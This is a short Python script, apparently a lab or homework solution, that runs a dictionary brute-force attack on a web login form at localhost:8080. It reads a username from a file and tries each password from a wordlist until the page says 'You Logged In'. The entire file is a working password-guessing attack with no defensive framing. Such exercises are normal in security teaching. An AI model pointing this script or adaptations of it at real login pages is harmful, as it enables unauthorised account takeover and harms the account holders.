import requests

def login(url, username, password):
    session = requests.Session()
    response = session.post(url, data={"username" : username, "password" : password, "submit" : "signIn"})
    return response, session
    

with open("../../Q1", "r+") as file:
    name = file.read().strip()
    
with open("../../Q2dictionary.txt", "r+") as file:
    passwords = file.read().splitlines()
    
for password in passwords:
    print(f"{name} : {password}")
    response, session = login("http://localhost:8080", name, password)
    if "You Logged In" in response.text:
        print("Found It!")
        break

